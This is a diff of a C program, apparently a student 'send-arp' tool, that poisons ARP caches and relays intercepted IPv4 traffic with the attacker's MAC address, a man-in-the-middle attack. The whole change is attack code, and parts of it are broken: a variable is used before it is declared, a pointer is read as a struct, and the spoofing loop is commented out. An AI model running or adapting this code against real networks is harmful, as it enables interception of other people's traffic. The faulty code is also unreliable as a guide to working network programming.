@@ -12,12 +12,15 @@
 #define MAC_SIZE 6
 
 
+
+
 #pragma pack(push, 1)
 struct EthArpPacket final {
     EthHdr eth_;
     ArpHdr arp_;
 };
 #pragma pack(pop)
+
 
 void usage() {
     printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
@@ -51,14 +54,14 @@ int getMyIp(const char* dev, EthArpPacket &packet) {
 
     return 0;
 }
-int getMyMac(const char* dev, EthArpPacket &packet) {
+unsigned char* getMyMac(const char* dev) {
     struct ifreq ifr;
     int sockfd, ret;
 
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
         printf("Fail to get interface MAC address - socket() failed - %m\n");
-        return -1;
+        return NULL;
     }
 
     strncpy(ifr.ifr_name, dev, IFNAMSIZ);
@@ -66,13 +69,19 @@ int getMyMac(const char* dev, EthArpPacket &packet) {
     if (ret < 0) {
         printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
         close(sockfd);
-        return -1;
+        return NULL;
     }
 
     close(sockfd);
-    memcpy(&packet.eth_.smac_, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
-    memcpy(&packet.arp_.smac_, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
-    return 0;
+
+    unsigned char* mac_address = (unsigned char*)malloc(MAC_SIZE);
+    if (mac_address == NULL) {
+        printf("Failed to allocate memory for MAC address\n");
+        return NULL;
+    }
+
+    memcpy(mac_address, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
+    return mac_address;
 }
 
 bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
@@ -120,17 +129,33 @@ bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {
     return true;
 }
 
-void relay_packet(pcap_t* handle) {
-    struct pcap_pkthdr header;  // header pcap gives us
+
+void relay_packet(pcap_t* handle,const char* dev) {
+    struct pcap_pkthdr* header;  // header pcap gives us
     const u_char *packet;       // actual packet
 
     // loop for packet capturing
     while (1) {
-        packet = pcap_next(handle, &header);
-        if (packet == NULL)  /* end of file */
-            break;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
 
-        // simply send the packet back out
+        //Ip packet parsing
+        // check Eth_type -> if ipv4 -> relay
+        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) continue;
+
+        // modify smac to mine (attacker)
+        unsigned char *m_mac= getMyMac(dev);
+        if (m_mac == NULL) {
+            fprintf(stderr, "Could not get MAC address.\n");
+            return;
+        }
+
+        struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;
+        memcpy(eth_hdr->ether_shost, m_mac, 6);
+        free(m_mac);         
+        //send to target
+
         if (pcap_sendpacket(handle, packet, header.len) != 0) {
             fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
             return;
@@ -154,7 +179,7 @@ int main(int argc, char* argv[]) {
     EthArpPacket myPacket;
 
     //config default
-	
+
 	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
 	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
 	myPacket.eth_.type_ = htons(EthHdr::Arp);
@@ -170,11 +195,20 @@ int main(int argc, char* argv[]) {
 	myPacket.arp_.tip_ = htonl(Ip(argv[2]));
 
     // Get network information
-    if(getMyMac(dev, myPacket) == -1 || getMyIp(dev, myPacket) == -1) {
+    if(getMyIp(dev,myPacket)==-1){
         return -1;
     }
+    
+    relay_packet(handle,dev);
 
-    // Get MAC address of sender
+/*     unsigned char *mymac = getMyMac(dev);
+    if (mymac==NULL){
+        return -1;
+    }
+    memcpy(&myPacket.eth_.smac_,mymac,MAC_SIZE);
+    memcpy(&myPacket.arp_.smac_,mymac,MAC_SIZE);
+
+
     if (!getSenderMac(handle, myPacket)) {
         printf("Failed to get sender MAC address.\n");
         return -1;
@@ -183,12 +217,13 @@ int main(int argc, char* argv[]) {
     // ARP spoof target
     myPacket.arp_.sip_ = htonl(Ip(argv[3]));
     myPacket.arp_.op_ = htons(ArpHdr::Reply);
-    if (!sendArpSpoof(handle, myPacket)) {
-        printf("Failed to send ARP spoofing packet.\n");
-        return -1;
+    while(1){
+    	if (!sendArpSpoof(handle, myPacket)) {
+        	printf("Failed to send ARP spoofing packet.\n");
+       		return -1;
+    	}
     }
-
-    printf("Spoofed ARP of target %s.\n", argv[3]);
+    printf("Spoofed ARP of target %s.\n", argv[3]); */
 
     pcap_close(handle);
     return 0;
